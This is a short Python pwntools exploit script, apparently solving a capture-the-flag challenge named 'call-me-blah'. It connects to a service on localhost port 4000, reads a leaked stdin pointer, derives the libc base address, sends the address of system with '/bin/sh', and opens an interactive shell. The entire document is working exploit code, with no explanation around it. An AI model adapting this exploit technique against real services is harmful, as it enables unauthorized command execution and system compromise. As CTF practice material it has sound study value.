from pwn import *

elf = ELF("./call-me-blah", checksec=False)
libc = ELF("./libc-2.36.so", checksec=False)
rop = ROP(elf)
rop_libc = ROP(libc)

r = remote('localhost', 4000)

leak_str = r.recvline().strip()
stdin_leak = int(leak_str, 16)
print("stdin leak: " + hex(stdin_leak))

libc.address = stdin_leak - libc.symbols['_IO_2_1_stdin_']
print("libc address: " + hex(libc.address))

system = libc.symbols['system']
r.sendline(str(system).encode())
r.sendline(b"/bin/sh")

r.interactive()
